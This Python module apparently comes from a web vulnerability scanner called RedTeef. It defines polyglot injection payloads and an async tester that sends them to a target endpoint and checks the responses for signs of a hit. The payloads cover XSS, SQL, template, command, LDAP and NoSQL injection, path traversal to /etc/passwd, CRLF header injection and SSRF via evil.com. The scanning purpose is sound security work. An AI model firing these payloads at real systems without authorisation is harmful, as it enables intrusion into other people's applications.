"""
RedTeef — Polyglot payloads.

Single payloads that trigger vulnerabilities across multiple contexts
(XSS + SQLi, SSTI + XSS, CMDi + SQLi, etc.).

These reduce the number of requests needed by testing several
vulnerability classes simultaneously.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger("krumpa.redteef.polyglot_payloads")


@dataclass
class PolyglotPayload:
    """A payload that targets multiple vulnerability classes at once."""
    label: str
    payload: str
    targets: List[str]  # which vuln classes this covers
    detection_hints: Dict[str, List[str]]  # vuln_class → response indicators


# ------------------------------------------------------------------
# Core polyglot payloads
# ------------------------------------------------------------------

_POLYGLOTS: List[PolyglotPayload] = [
    PolyglotPayload(
        label="xss-sqli-ssti-basic",
        payload="'\"-->]]>*/</script><svg onload=alert(1)>{{7*7}}${7*7}",
        targets=["xss", "sqli", "ssti"],
        detection_hints={
            "xss": ["<svg onload=alert(1)>", "alert(1)"],
            "sqli": ["sql syntax", "unclosed quotation", "unterminated string", "syntax error"],
            "ssti": ["49", "7*7"],
        },
    ),
    PolyglotPayload(
        label="xss-ssti-cmdi",
        payload="<img src=x onerror=alert(1)>{{config}}$(id)`id`",
        targets=["xss", "ssti", "cmdi"],
        detection_hints={
            "xss": ["<img src=x onerror=alert(1)>", "onerror"],
            "ssti": ["<Config", "SECRET_KEY", "config"],
            "cmdi": ["uid=", "gid=", "groups="],
        },
    ),
    PolyglotPayload(
        label="sqli-ssti-xss-full",
        payload="1'\"\\`--/*{{7*7}}*/</script><img src=x onerror=alert(1)>",
        targets=["sqli", "ssti", "xss"],
        detection_hints={
            "sqli": ["sql", "syntax", "error", "unclosed", "unterminated"],
            "ssti": ["49"],
            "xss": ["<img src=x onerror=alert(1)>"],
        },
    ),
    PolyglotPayload(
        label="cmdi-sqli-ssti",
        payload=";sleep(5)#'\"||pg_sleep(5)--{{7*7}}",
        targets=["cmdi", "sqli", "ssti"],
        detection_hints={
            "cmdi": [],  # timing only
            "sqli": ["pg_sleep", "syntax", "error"],
            "ssti": ["49"],
        },
    ),
    PolyglotPayload(
        label="xss-xmli-sqli",
        payload='<x]><![CDATA[><img src=x onerror=alert(1)>]]>\'OR 1=1--',
        targets=["xss", "xxe", "sqli"],
        detection_hints={
            "xss": ["<img src=x onerror=alert(1)>", "alert"],
            "xxe": ["xml", "cdata", "entity", "parser"],
            "sqli": ["syntax", "error", "unclosed"],
        },
    ),
    PolyglotPayload(
        label="ssti-xss-ldap",
        payload="{{7*7}}*)(uid=*))(|(uid=*<script>alert(1)</script>",
        targets=["ssti", "ldap", "xss"],
        detection_hints={
            "ssti": ["49"],
            "ldap": ["bad search filter", "filter error", "ldap"],
            "xss": ["<script>alert(1)</script>"],
        },
    ),
    PolyglotPayload(
        label="nosql-sqli-ssti",
        payload='{"$gt":""}\'OR 1=1--{{7*7}}',
        targets=["nosql", "sqli", "ssti"],
        detection_hints={
            "nosql": ["$gt", "operator", "mongodb"],
            "sqli": ["syntax", "error"],
            "ssti": ["49"],
        },
    ),
    PolyglotPayload(
        label="path-xss-sqli",
        payload="../../etc/passwd<img src=x onerror=alert(1)>'OR 1=1--",
        targets=["path-traversal", "xss", "sqli"],
        detection_hints={
            "path-traversal": ["root:", "/bin/", "daemon:", "nobody:"],
            "xss": ["<img src=x onerror=alert(1)>"],
            "sqli": ["syntax", "error"],
        },
    ),
    PolyglotPayload(
        label="xss-complete-polyglot",
        payload=(
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
            "%0telerik/telerik/%0D%0ASet-Cookie:crlf=1"
        ),
        targets=["xss", "crlf"],
        detection_hints={
            "xss": ["onclick", "alert", "javascript:"],
            "crlf": ["set-cookie", "crlf=1"],
        },
    ),
    PolyglotPayload(
        label="ssrf-redirect-sqli",
        payload="http://127.0.0.1#'OR 1=1--@evil.com/../../../etc/passwd",
        targets=["ssrf", "open-redirect", "sqli", "path-traversal"],
        detection_hints={
            "ssrf": ["127.0.0.1", "localhost", "internal"],
            "open-redirect": ["evil.com", "location:"],
            "sqli": ["syntax", "error"],
            "path-traversal": ["root:", "/bin/"],
        },
    ),
]


@dataclass
class PolyglotResult:
    """Result of testing a single polyglot payload."""
    payload: PolyglotPayload
    triggered_classes: Set[str] = field(default_factory=set)
    evidence: Dict[str, str] = field(default_factory=dict)
    response_status: int = 0
    response_time: float = 0.0


class PolyglotPayloadTester:
    """
    Test endpoints with polyglot payloads that cover multiple
    vulnerability classes in a single request.

    This reduces scan time by combining SQLi + XSS + SSTI + CMDi + etc.
    probes into single requests, each covering 2-4 vuln classes.
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        timing_threshold: float = 4.0,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._timing_threshold = timing_threshold

    async def test(
        self,
        target: Target,
        *,
        inject_field: str = "",
        vuln_classes: Optional[List[str]] = None,
    ) -> List[Finding]:
        """
        Fire polyglot payloads at *target*, detect which vuln classes trigger.

        Args:
            target: The endpoint to test.
            inject_field: Specific parameter to inject into.
            vuln_classes: Limit to polyglots covering these classes.

        Returns:
            Findings for each confirmed vulnerability class.
        """
        findings: List[Finding] = []
        payloads = self._select_payloads(vuln_classes)

        for poly in payloads:
            result = await self._fire_polyglot(target, poly, inject_field)
            for vuln_class in result.triggered_classes:
                findings.append(self._build_finding(target, poly, vuln_class, result))

        return findings

    def _select_payloads(self, vuln_classes: Optional[List[str]]) -> List[PolyglotPayload]:
        """Filter polyglots to those covering requested classes."""
        if not vuln_classes:
            return list(_POLYGLOTS)
        vc_set = set(vuln_classes)
        return [p for p in _POLYGLOTS if vc_set & set(p.targets)]

    async def _fire_polyglot(
        self,
        target: Target,
        poly: PolyglotPayload,
        inject_field: str,
    ) -> PolyglotResult:
        """Send a polyglot payload and analyse the response."""
        result = PolyglotResult(payload=poly)

        if not self._client:
            return result

        method = target.method or "GET"
        headers = dict(target.headers or {})

        # Build request with payload
        url = target.url
        data: Optional[str] = None
        if inject_field and method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            url = f"{url}{sep}{inject_field}={poly.payload}"
        elif inject_field:
            data = f"{inject_field}={poly.payload}"
            if "content-type" not in {k.lower() for k in headers}:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            if method.upper() in ("POST", "PUT", "PATCH"):
                data = poly.payload
            else:
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}q={poly.payload}"

        import time as _time
        start = _time.monotonic()

        try:
            resp = await self._client.request(method, url, headers=headers, body=data)
            elapsed = _time.monotonic() - start
            result.response_status = resp.status_code
            result.response_time = elapsed

            text = resp.text
            text_lower = text.lower()
            resp_headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}

            # Check each target vuln class
            for vuln_class in poly.targets:
                hints = poly.detection_hints.get(vuln_class, [])
                if self._check_indicators(text_lower, resp_headers_lower, hints, vuln_class, elapsed):
                    result.triggered_classes.add(vuln_class)
                    result.evidence[vuln_class] = self._extract_evidence(
                        text, hints, vuln_class,
                    )

        except Exception as exc:
            logger.debug("Polyglot error for %s on %s: %s", poly.label, target.url, exc)

        return result

    def _check_indicators(
        self,
        text_lower: str,
        headers_lower: Dict[str, str],
        hints: List[str],
        vuln_class: str,
        elapsed: float,
    ) -> bool:
        """Check if response indicates a triggered vulnerability."""
        # String-based indicators
        for hint in hints:
            if hint.lower() in text_lower:
                return True
            # Also check headers (e.g., Set-Cookie for CRLF)
            for _hk, hv in headers_lower.items():
                if hint.lower() in hv:
                    return True

        # Timing-based (for cmdi / sqli sleep)
        if vuln_class in ("cmdi", "sqli") and elapsed >= self._timing_threshold:
            return True

        return False

    @staticmethod
    def _extract_evidence(text: str, hints: List[str], vuln_class: str) -> str:
        """Extract relevant evidence snippet from response."""
        for hint in hints:
            idx = text.lower().find(hint.lower())
            if idx >= 0:
                start = max(0, idx - 50)
                end = min(len(text), idx + len(hint) + 50)
                return f"[{vuln_class}] ...{text[start:end]}..."
        return f"[{vuln_class}] detected via response analysis"

    @staticmethod
    def _build_finding(
        target: Target,
        poly: PolyglotPayload,
        vuln_class: str,
        result: PolyglotResult,
    ) -> Finding:
        """Build a Finding for a triggered vulnerability class."""
        severity_map: Dict[str, Severity] = {
            "sqli": Severity.CRITICAL,
            "cmdi": Severity.CRITICAL,
            "ssti": Severity.HIGH,
            "xss": Severity.HIGH,
            "xxe": Severity.HIGH,
            "ssrf": Severity.HIGH,
            "nosql": Severity.HIGH,
            "ldap": Severity.HIGH,
            "path-traversal": Severity.HIGH,
            "open-redirect": Severity.MEDIUM,
            "crlf": Severity.MEDIUM,
        }
        cwe_map: Dict[str, int] = {
            "sqli": 89,
            "xss": 79,
            "ssti": 1336,
            "cmdi": 78,
            "xxe": 611,
            "ssrf": 918,
            "nosql": 943,
            "ldap": 90,
            "path-traversal": 22,
            "open-redirect": 601,
            "crlf": 93,
        }

        return Finding(
            title=f"[POLYGLOT] {vuln_class.upper()} detected via polyglot '{poly.label}'",
            description=(
                f"Polyglot payload '{poly.label}' triggered a {vuln_class} indicator "
                f"on {target.url}. This payload covers: {', '.join(poly.targets)}."
            ),
            severity=severity_map.get(vuln_class, Severity.MEDIUM),
            target=target,
            evidence=result.evidence.get(vuln_class, "polyglot detection"),
            remediation=(
                f"Investigate the {vuln_class} vulnerability. "
                "Apply context-specific output encoding and input validation."
            ),
            cwe=cwe_map.get(vuln_class, 20),
            tags=["polyglot", vuln_class, "redteef", poly.label],
        )
